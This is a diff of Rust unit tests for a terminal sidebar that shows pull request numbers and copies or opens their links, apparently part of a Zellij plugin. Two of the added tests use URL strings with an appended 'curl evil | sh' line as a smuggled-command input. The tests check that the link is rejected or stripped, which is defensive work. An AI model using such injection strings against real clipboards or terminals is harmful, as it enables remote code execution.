+            (Spot::Local(pane_of("s", 10, 3)), none),
+            (Spot::Local(pane_of("s", 10, 4)), none),
+            (Spot::Local(Place::Session(listed("s", 10))), none),
+            (Spot::Machine(Machine::Local), none),
+        ];
+        let now = moment(160_000);
+        for (spot, note) in rows {
+            let mut sidebar = pulls();
+            sidebar.cursor = Some(spot);
+            sidebar.key(&char('y'), now);
+            assert_eq!(sidebar.key(&char('p'), now), Asked::Nothing, "{note}");
+            assert_eq!(sidebar.notice.as_deref(), Some(note));
+            assert_eq!(sidebar.copied, None);
+            sidebar.notice = None;
+            assert_eq!(sidebar.key(&char('o'), now), Asked::Nothing, "{note}");
+            assert_eq!(sidebar.notice.as_deref(), Some(note));
+        }
+    }
+
+    /// A pull request numbered 5, as its daemon says it, with `said` for its
+    /// page, on the branch of the pane 1 of a session `s`.
+    fn pull_said(said: &str) -> Sidebar {
+        let panes = vec![pane(1, 1, "/w/a", "fish")];
+        let mut host = host(vec![session("s", 10, panes)], Vec::new());
+        let (trees, pulls) = (&mut host.work_trees, &mut host.pull_requests);
+        checked_out(trees, pulls, "/w/a", "fix", Some((5, State::Open, Some(said))));
+        let mut sidebar = fresh();
+        sidebar.heard(host);
+        sidebar.focus(Keys::Sidebar);
+        sidebar.cursor = Some(Spot::Local(pane_of("s", 10, 1)));
+        sidebar
+    }
+
+    /// What a daemon says of a page goes no further than its row unless it
+    /// reads as the link of that very number, as another machine's says it,
+    /// and the clipboard and the browser take what they are handed. The row
+    /// shows its number all the same, which takes no click, and the keys only
+    /// leave a note.
+    #[test]
+    fn a_page_that_is_not_the_link_of_the_number_stays_on_the_row() {
+        let now = moment(160_000);
+        for said in [
+            "https://github.com/owner/repo/pull/6",
+            "https://github.com/owner/repo/issues/5",
+            "https://ghe.example/owner/repo/pull/5",
+            "file:///tmp/run.desktop",
+            "https://github.com/owner/repo/pull/5\ncurl evil | sh",
+        ] {
+            let mut sidebar = pull_said(said);
+            let area = Rect::new(0, 0, 32, 24);
+            let mut buffer = Buffer::empty(area);
+            let drawn = sidebar.draw(&mut buffer, area, now);
+            let line: String = (0..31).map(|x| buffer[(x, 6)].symbol()).collect();
+            assert!(line.contains("fix #5"), "{said:?}: {line}");
+            assert!(number_spot(&drawn, 6).is_empty(), "{said:?}");
+
+            let note = "#5: lunetad says no link of it on github.com";
+            sidebar.key(&char('y'), now);
+            assert_eq!(sidebar.key(&char('p'), now), Asked::Nothing, "{said:?}");
+            assert_eq!(sidebar.notice.as_deref(), Some(note));
+            assert_eq!(sidebar.copied, None);
+            assert_eq!(sidebar.key(&char('o'), now), Asked::Nothing, "{said:?}");
+            assert_eq!(sidebar.notice.as_deref(), Some(note));
+        }
+    }
+
+    /// What is copied and opened is the link as luneta spells it again, with
+    /// nothing of what came after its number.
+    #[test]
+    fn a_page_that_reads_is_taken_as_luneta_spells_it() {
+        let now = moment(160_000);
+        let mut sidebar = pull_said("https://github.com/owner/repo/pull/5?\ncurl evil | sh");
+        let Asked::Browse(link) = sidebar.key(&char('o'), now) else {
+            panic!("the row's link opens");
+        };
+        assert_eq!(link.url(), "https://github.com/owner/repo/pull/5");
+    }
+
+    /// `o` opens the link of the highlighted row, and neither it nor `y p`
+    /// asks anything of another machine: its daemon said the link, and luneta
+    /// runs where you sit.
+    #[test]
+    fn o_and_y_p_take_another_machine_s_link_too() {
+        let mut sidebar = pulls();
+        sidebar.cursor = Some(Spot::Local(pane_of("s", 10, 1)));
+        let now = moment(160_000);
+        assert_eq!(sidebar.key(&char('o'), now), Asked::Browse(link()));
+        assert_eq!(sidebar.copied, None, "what opens shows");
+
+        let far = "https://github.com/owner/repo/pull/8";
+        let far_link = Link::parse(far).expect("a link");
+        let mut host = machines();
+        let Reached::Host(there) = host.remotes[0].reached.as_mut().unwrap() else {
+            panic!("nixos is reached");
+        };
+        let (trees, pulls) = (&mut there.work_trees, &mut there.pull_requests);
+        checked_out(trees, pulls, "/w/b", "fix", Some((8, State::Open, Some(far))));
+        let mut sidebar = fresh();
+        sidebar.heard(host);
+        sidebar.focus(Keys::Sidebar);
+        let place = Place::Pane(PanePlace { session: listed("main", 20), pane: 1 });
+        sidebar.cursor = Some(Spot::Remote(nixos(), place));
+        assert_eq!(sidebar.key(&char('o'), now), Asked::Browse(far_link.clone()));
+        sidebar.key(&char('y'), now);
+        assert_eq!(sidebar.key(&char('p'), now), Asked::Copy(far_link));
+    }
+
+    /// The number is a spot of its own, on exactly the columns it is drawn
+    /// on, whatever keeps it there: a branch cut short, of wide characters,
+    /// and how its work tree stands. The rest of its line is the pane's. It
+    /// takes a click wherever the keys are. One with no link is the pane's
+    /// too, and so is the line of a row with none.
+    #[test]
+    fn the_number_of_a_pull_request_is_a_spot_of_its_own() {
+        let mut sidebar = pulls();
+        let host = sidebar.host.as_mut().unwrap();
+        let panes = ["/w/e", "/w/f"].iter().zip(5..).map(|(cwd, id)| pane(id, id, cwd, "fish"));
+        host.sessions[0].panes.as_mut().unwrap().panes.extend(panes);
+        let (trees, pulls) = (&mut host.work_trees, &mut host.pull_requests);
+        let long = "handoff-eng-11259-and-more";
+        let (merged, draft) = (LINK.replace("246", "4321"), LINK.replace("246", "12"));
+        checked_out(trees, pulls, "/w/e", long, Some((4321, State::Merged, Some(&merged))));
+        checked_out(trees, pulls, "/w/f", "日本語の枝の名前が長い", Some((12, State::Draft, Some(&draft))));
+        let host = sidebar.host.clone().unwrap();
+        sidebar.heard(host);
+
+        for keys in [Keys::Zellij, Keys::Sidebar] {
+            sidebar.focus(keys);
+            let area = Rect::new(0, 0, 32, 32);
+            let mut buffer = Buffer::empty(area);
+            let drawn = sidebar.draw(&mut buffer, area, moment(160_000));
+            // The columns of `number`, by the cells it is drawn in.
+            let columns = |y: u16, number: &str| {
+                let cells: Vec<&str> = (0..31).map(|x| buffer[(x, y)].symbol()).collect();
+                let start = cells.windows(number.len()).position(|it| it.concat() == number);
+                let start = u16::try_from(start.expect(number)).unwrap();
+                (start..start + u16::try_from(number.len()).unwrap()).collect::<Vec<_>>()
+            };
+            assert_eq!(number_spot(&drawn, 6), columns(6, "#246"));
+            for (y, why) in [(8, "old: no link"), (10, "gone: closed"), (12, "none: no number")] {
+                assert!(number_spot(&drawn, y).is_empty(), "{why}");
+            }
+            assert_eq!(number_spot(&drawn, 14), columns(14, "#4321"));
+            assert_eq!(number_spot(&drawn, 16), columns(16, "#12"));
+            let on = drawn.at(Position::new(columns(6, "#246")[0], 6));
+            assert_eq!(on, Some(Hit::Number(link())));
+        }
+    }
+
+    /// A number scrolled off the rows takes no click, and neither does what
+    /// is drawn over the line it would be on; nor one under a session the
+    /// mouse lifted, whose rows make room for it.
+    #[test]
+    fn a_number_out_of_sight_takes_no_click() {
+        let mut sidebar = pulls();
+        sidebar.focus(Keys::Zellij);
+        // Four lines of rows, under the title, its rule and a blank: the
+        // machine's header, the session's row, and the pane's two.
+        let area = Rect::new(0, 0, 32, 7);
+        let mut buffer = Buffer::empty(area);
+        let drawn = sidebar.draw(&mut buffer, area, moment(160_000));
+        assert_eq!(number_spot(&drawn, 6).len(), "#246".len());
+
+        // Scrolled past #246's line, as far as #7's, which has no link.
+        sidebar.top = 4;
+        let drawn = sidebar.draw(&mut buffer, area, moment(160_000));
+        assert_eq!((0..7).flat_map(|y| number_spot(&drawn, y)).count(), 0);
+
+        // A note takes #246's line.
+        sidebar.top = 0;
+        sidebar.notify("something went wrong".to_owned());
+        let drawn = sidebar.draw(&mut buffer, area, moment(160_000));
+        assert!(number_spot(&drawn, 6).is_empty());
+        sidebar.notice = None;
+
+        // Lifted, by the session's row.
+        let area = Rect::new(0, 0, 32, 24);
+        let left = MouseButton::Left;
+        sidebar.mouse(mouse(MouseEventKind::Down(left), 10, 4), area);
+        assert_eq!(sidebar.mouse(mouse(MouseEventKind::Drag(left), 10, 6), area), Asked::Take);
+        let mut buffer = Buffer::empty(area);
+        let drawn = sidebar.draw(&mut buffer, area, moment(160_000));
+        assert_eq!((0..24).flat_map(|y| number_spot(&drawn, y)).count(), 0);
+    }
+
+    /// A click on a number copies its link and does nothing else: the
+    /// highlight and the keys stay, and so does what the row's own click
+    /// would do. It drops a `y` pressed before it, as any click does.
+    #[test]
+    fn a_click_on_a_number_copies_and_does_nothing_else() {
+        let mut sidebar = pulls();
+        sidebar.focus(Keys::Zellij);
+        let here = sidebar.cursor.clone();
+        let now = moment(160_000);
+        sidebar.notify("what went wrong before".to_owned());
+        assert_eq!(sidebar.number_clicked(link(), now), Asked::Copy(link()));
+        assert_eq!(sidebar.cursor, here);
+        assert_eq!(sidebar.keys, Keys::Zellij);
+        assert_eq!(sidebar.notice, None);
+        assert_eq!(sidebar.copied, Some((link().number(), now)));
+
+        sidebar.focus(Keys::Sidebar);
+        sidebar.cursor = Some(Spot::Local(pane_of("s", 10, 1)));
+        sidebar.key(&char('y'), now);
+        sidebar.number_clicked(link(), now);
+        assert_eq!(sidebar.key(&char('p'), now), Asked::Nothing);
+    }
+    /// Each line of the sidebar drawn 32 by 19, from the line `from` down, as
     /// text, and what a click a few columns into it hits.
     fn clicks(sidebar: &mut Sidebar, from: u16) -> Vec<(String, Option<Hit>)> {
-        let area = Rect::new(0, 0, 32, 17);
+        let area = Rect::new(0, 0, 32, 19);
         let mut buffer = Buffer::empty(area);
         let drawn = sidebar.draw(&mut buffer, area, moment(160_000));
         let text = |y| (0..31).map(|x| buffer[(x, y)].symbol()).collect::<String>();
         let click = |y| (text(y).trim_end().to_owned(), drawn.at(Position::new(4, y)));
-        (from..17).map(click).collect()
+        (from..19).map(click).collect()
     }
 
     fn on_legend(c: char) -> Hit {
@@ -7073,6 +7610,8 @@ mod tests {
             (" /  Search", Some(on_legend('/'))),
             (" u  Unread", Some(on_legend('u'))),
             (" v  Reorder", Some(on_legend('v'))),
+            (" o  Open PR", Some(on_legend('o'))),
+            (" y  Yank ▸", Some(on_legend('y'))),
             (" a  Ask", Some(on_legend('a'))),
             (" c  Claude ▸", Some(on_legend('c'))),
             (" n  New ▸", Some(on_legend('n'))),
@@ -7081,7 +7620,7 @@ mod tests {
             (" b  Brief ▸", Some(on_legend('b'))),
         ]);
         sidebar.keys_clicked(Keyed::Legend, &char('n'), moment(160_000));
-        let clicked = clicks(&mut sidebar, 11);
+        let clicked = clicks(&mut sidebar, 13);
         let menu: Vec<(&str, Option<Hit>)> =
             clicked.iter().map(|(text, hit)| (text.as_str(), hit.clone())).collect();
         assert_eq!(menu, [
@@ -7102,11 +7641,11 @@ mod tests {
         let mut sidebar = two_sessions();
         sidebar.focus(Keys::Sidebar);
         sidebar.keys_clicked(Keyed::Legend, &char('d'), moment(160_000));
-        let delete = clicks(&mut sidebar, 14);
+        let delete = clicks(&mut sidebar, 16);
         assert_eq!(delete[0].1, Some(on_menu(KeyCode::Char('d'))), "{delete:?}");
         let clicked = sidebar.keys_clicked(Keyed::Legend, &char('d'), moment(160_000));
         assert_eq!(clicked, Asked::Nothing);
-        assert_eq!(clicks(&mut sidebar, 14), delete);
+        assert_eq!(clicks(&mut sidebar, 16), delete);
         let deleted = sidebar.chose(1, Choice::Key(char('d')), moment(160_000));
         assert_ne!(deleted, Asked::Nothing);
     }
@@ -7129,7 +7668,7 @@ mod tests {
             runs: crate::skills::Runs::ForAnyone,
         };
         sidebar.found(1, Ok(vec![skill("code-review"), skill("tigerstyle")]));
-        let clicked = clicks(&mut sidebar, 12);
+        let clicked = clicks(&mut sidebar, 14);
         let skills: Vec<(&str, Option<Hit>)> =
             clicked[1..4].iter().map(|(text, hit)| (text.as_str(), hit.clone())).collect();
         let on = |skill| Some(Hit::Menu(1, Choice::Skill(name(skill))));
@@ -8123,7 +8662,7 @@ mod tests {
     /// The rows the sidebar draws under this machine's header, focused, with
     /// no rule after a session's name, and which of them the highlight is on.
     fn drawn_rows(sidebar: &mut Sidebar) -> (Vec<String>, Vec<usize>) {
-        let (lines, lit) = seen(sidebar, true, 32, 24);
+        let (lines, lit) = seen(sidebar, true, 32, 26);
         let from = sessions_from(&lines);
         let rows = lines[from..].iter().take_while(|line| !line.is_empty());
         let rows = rows.map(|line| line.trim_end_matches(['─', ' ']).to_owned()).collect();
@@ -8144,7 +8683,7 @@ mod tests {
         type_in(&mut sidebar, "vjjk");
         let (_, lit) = drawn_rows(&mut sidebar);
         assert_eq!(lit, (0..6).collect::<Vec<_>>());
-        sidebar.mouse(mouse(MouseEventKind::Moved, 10, 4), Rect::new(0, 0, 32, 24));
+        sidebar.mouse(mouse(MouseEventKind::Moved, 10, 4), Rect::new(0, 0, 32, 26));
         // Shift and all, as a terminal sends it as text.
         let shifted = |c| KeyEvent::new(KeyCode::Char(c), KeyModifiers::SHIFT);
         sidebar.key(&shifted('J'), moment(160_000));
@@ -8188,7 +8727,7 @@ mod tests {
     #[test]
     fn a_session_dragged_lands_where_it_shows() {
         let mut sidebar = searched();
-        let area = Rect::new(0, 0, 32, 24);
+        let area = Rect::new(0, 0, 32, 26);
         let (before, _) = drawn_rows(&mut sidebar);
         let left = MouseButton::Left;
         let mut act = |kind, column, row| sidebar.mouse(mouse(kind, column, row), area);
@@ -8228,7 +8767,7 @@ mod tests {
     #[test]
     fn a_session_lifted_goes_back_off_the_sidebar_or_on_esc() {
         let mut sidebar = searched();
-        let area = Rect::new(0, 0, 32, 24);
+        let area = Rect::new(0, 0, 32, 26);
         let (listed, _) = drawn_rows(&mut sidebar);
         let left = MouseButton::Left;
         // zed's row, to the top.
@@ -8261,7 +8800,7 @@ mod tests {
     fn the_left_button_down_has_the_keys() {
         let mut sidebar = searched();
         sidebar.focus(Keys::Sidebar);
-        let area = Rect::new(0, 0, 32, 24);
+        let area = Rect::new(0, 0, 32, 26);
         drawn_rows(&mut sidebar);
         let left = MouseButton::Left;
         // zed's row, to the top.
@@ -8303,8 +8842,8 @@ mod tests {
     fn a_session_held_on_the_edge_scrolls_the_rows() {
         let mut sidebar = searched();
         // Four lines of rows, between the rule and the legend.
-        let area = Rect::new(0, 0, 32, 17);
-        let first = |sidebar: &mut Sidebar| screen(sidebar, true, 32, 17)[HEADER].clone();
+        let area = Rect::new(0, 0, 32, 19);
+        let first = |sidebar: &mut Sidebar| screen(sidebar, true, 32, 19)[HEADER].clone();
         assert_eq!(first(&mut sidebar), format!(" ▾ \u{f108} mac {}", "═".repeat(21)));
         let left = MouseButton::Left;
         sidebar.mouse(mouse(MouseEventKind::Down(left), 10, 4), area);
@@ -8487,7 +9026,7 @@ mod tests {
         let enter = KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE);
         assert_eq!(sidebar.key(&enter, moment(160_000)), Asked::Nothing);
         assert!(!sidebar.folds.contains(Fold::Machine(&machine)));
-        let area = Rect::new(0, 0, 32, 24);
+        let area = Rect::new(0, 0, 32, 26);
         screen(&mut sidebar, true, area.width, area.height);
         assert_eq!(click(&mut sidebar, 20, 6, area), Asked::Take);
         assert!(sidebar.folds.contains(Fold::Machine(&machine)));
@@ -8531,7 +9070,7 @@ mod tests {
         assert_eq!(sidebar.key(&char('p'), moment(160_000)), asked);
         sidebar.close_menu();
 
-        let area = Rect::new(0, 0, 32, 24);
+        let area = Rect::new(0, 0, 32, 26);
         let lines = screen(&mut sidebar, true, area.width, area.height);
         assert_eq!(lines[8], "  •✓ \u{ec82} fix                  1m");
         assert_eq!(click(&mut sidebar, 10, 8, area), there);
@@ -8916,7 +9455,7 @@ mod tests {
         let vps = Machine::Remote("me@vps".parse().unwrap());
         assert_eq!(sidebar.cursor, Some(Spot::Machine(vps.clone())));
         let enter = KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE);
-        let area = Rect::new(0, 0, 32, 24);
+        let area = Rect::new(0, 0, 32, 26);
         for folded in [false, true] {
             sidebar.folds.set(Fold::Machine(&vps), folded);
             type_in(&mut sidebar, "hl ");
@@ -8940,7 +9479,7 @@ mod tests {
         type_in(&mut sidebar, "nm-x");
         let enter = KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE);
         assert_eq!(sidebar.key(&enter, moment(160_000)), Asked::Nothing);
-        let lines = screen(&mut sidebar, true, 32, 24);
+        let lines = screen(&mut sidebar, true, 32, 26);
         assert!(lines.iter().any(|line| line.starts_with(" not a destination:")), "{lines:?}");
         let backspace = KeyEvent::new(KeyCode::Backspace, KeyModifiers::NONE);
         sidebar.key(&backspace, moment(160_000));
@@ -9016,20 +9555,20 @@ mod tests {
     fn another_machine_s_session_dragged_lands_among_its_own() {
         let mut sidebar = fresh();
         sidebar.heard(two_each());
-        let area = Rect::new(0, 0, 32, 24);
+        let area = Rect::new(0, 0, 32, 26);
         screen(&mut sidebar, true, area.width, area.height);
         let left = MouseButton::Left;
         // dev's row, under nixos's main, up over mac's.
         sidebar.mouse(mouse(MouseEventKind::Down(left), 10, 11), area);
         assert_eq!(sidebar.mouse(mouse(MouseEventKind::Drag(left), 10, 4), area), Asked::Take);
-        let (lines, lit) = seen(&mut sidebar, true, 32, 24);
+        let (lines, lit) = seen(&mut sidebar, true, 32, 26);
         assert_eq!((lines[9].as_str(), lit), (" ▾ dev ───────────────────────", vec![9, 10]));
         sidebar.mouse(mouse(MouseEventKind::Up(left), 10, 4), area);
         assert_eq!(names_listed(&sidebar), ["main", "work", "dev", "main"]);
         // dev, now nixos's first, down past every machine.
         sidebar.mouse(mouse(MouseEventKind::Down(left), 10, 9), area);
         sidebar.mouse(mouse(MouseEventKind::Drag(left), 10, 16), area);
-        assert_eq!(seen(&mut sidebar, true, 32, 24).1, [11, 12]);
+        assert_eq!(seen(&mut sidebar, true, 32, 26).1, [11, 12]);
         sidebar.mouse(mouse(MouseEventKind::Up(left), 10, 16), area);
         assert_eq!(names_listed(&sidebar), ["main", "work", "main", "dev"]);
         let rows = rows_shown(&mut sidebar);
@@ -9062,13 +9601,13 @@ mod tests {
         assert_eq!(sidebar.cursor, Some(Spot::Machine(Machine::Local)));
         type_in(&mut sidebar, "vJ");
         assert_eq!(machines_listed(&sidebar), ["nixos", "mac", "me@vps", "pi"]);
-        assert_eq!(seen(&mut sidebar, true, 32, 24).1, [6]);
+        assert_eq!(seen(&mut sidebar, true, 32, 26).1, [6]);
         type_in(&mut sidebar, "jJ");
         assert_eq!(machines_listed(&sidebar), ["nixos", "pi", "mac", "me@vps"]);
-        assert_eq!(seen(&mut sidebar, true, 32, 24).1, [7, 8]);
+        assert_eq!(seen(&mut sidebar, true, 32, 26).1, [7, 8]);
         type_in(&mut sidebar, "KKK");
         assert_eq!(machines_listed(&sidebar), ["mac", "me@vps", "nixos", "pi"]);
-        let (lines, lit) = seen(&mut sidebar, true, 32, 24);
+        let (lines, lit) = seen(&mut sidebar, true, 32, 26);
         assert_eq!(lit, [3, 4]);
         assert_eq!(lines[5], " ▾ \u{f108} nixos ════════════════ ●1");
         sidebar.heard(machines());
@@ -9086,13 +9625,13 @@ mod tests {
     fn a_machine_dragged_by_its_header_lands_where_it_shows() {
         let mut sidebar = fresh();
         sidebar.heard(machines());
-        let area = Rect::new(0, 0, 32, 24);
+        let area = Rect::new(0, 0, 32, 26);
         screen(&mut sidebar, true, area.width, area.height);
         let left = MouseButton::Left;
         // nixos's header, to the top.
         sidebar.mouse(mouse(MouseEventKind::Down(left), 10, 6), area);
         assert_eq!(sidebar.mouse(mouse(MouseEventKind::Drag(left), 10, 3), area), Asked::Take);
-        let (lines, lit) = seen(&mut sidebar, true, 32, 24);
+        let (lines, lit) = seen(&mut sidebar, true, 32, 26);
         assert_eq!(lines[HEADER], " ▾ \u{f108} nixos ════════════════ ●1");
         assert_eq!(lit, [3, 4, 5]);
         sidebar.mouse(mouse(MouseEventKind::Up(left), 10, 3), area);
@@ -9120,7 +9659,7 @@ mod tests {
         sidebar.folds.set(Fold::Machine(&Machine::Remote(nixos())), true);
         sidebar.focus(Keys::Sidebar);
         type_in(&mut sidebar, "/fix");
-        let lines = screen(&mut sidebar, true, 32, 24);
+        let lines = screen(&mut sidebar, true, 32, 26);
         assert_eq!(
             lines[HEADER..HEADER + 3],
             [
@@ -9233,7 +9772,7 @@ mod tests {
 
         // zed to the bottom, there, by its row, as it lists bipa over notes
         // still.
-        let area = Rect::new(0, 0, 32, 24);
+        let area = Rect::new(0, 0, 32, 26);
         drawn_rows(&mut there);
         let left = MouseButton::Left;
         there.mouse(mouse(MouseEventKind::Down(left), 10, 4), area);
